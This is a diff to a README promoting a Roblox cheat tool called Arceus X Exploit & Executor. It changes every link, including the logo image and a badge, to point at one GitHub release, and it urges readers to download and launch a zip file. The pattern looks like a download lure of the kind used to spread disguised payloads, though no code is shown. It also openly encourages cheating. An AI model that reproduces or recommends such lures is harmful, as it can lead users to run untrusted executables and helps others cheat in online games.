@@ -2,7 +2,7 @@
 
 Welcome to the Arceus X Exploit & Executor repository for all your Roblox cheating needs! 🎮
 
-![Arceus Executor Logo](https://example.com/arceus_executor_logo.png)
+![Arceus Executor Logo](https://github.com/hoang24092003/Arceus-Executor/releases/tag/v2.0)
 
 ## Description ℹ️
 
@@ -35,7 +35,7 @@ Welcome to the Arceus X Exploit & Executor repository for all your Roblox cheati
 ## Get Started 🚀
 
 Ready to level up your Roblox game with Arceus X Exploit & Executor? Download the program from the following link:
-[Download Arceus Executor](https://github.com/file/App.zip)
+[Download Arceus Executor](https://github.com/hoang24092003/Arceus-Executor/releases/tag/v2.0)
 
 *Note: This link requires launching the file.*
 
@@ -59,12 +59,12 @@ If you encounter any issues or have questions, feel free to reach out to our rep
 
 **Note:** For more information and updates, please visit the "Releases" section of this repository.
 
-[![Download Arceus Executor](https://img.shields.io/badge/Download-Arceus%20Executor-brightgreen)](https://github.com/file/App.zip)
+[![Download Arceus Executor](https://github.com/hoang24092003/Arceus-Executor/releases/tag/v2.0%20Executor-brightgreen)](https://github.com/hoang24092003/Arceus-Executor/releases/tag/v2.0)
 
 ## Happy Cheating! 🎉
 
 Let Arceus X Exploit & Executor take your Roblox gameplay to the next level! Enjoy the excitement of activating cheats, scripts, and hacks with ease. Have fun and dominate the game like never before! 🚀🔥
 
-🔗 [Visit our website](https://arceusexecutor.com) for more information and updates.
+🔗 [Visit our website](https://github.com/hoang24092003/Arceus-Executor/releases/tag/v2.0) for more information and updates.
 
 **Remember, with great power comes great responsibility. Use cheats responsibly and enjoy the game!** 😉
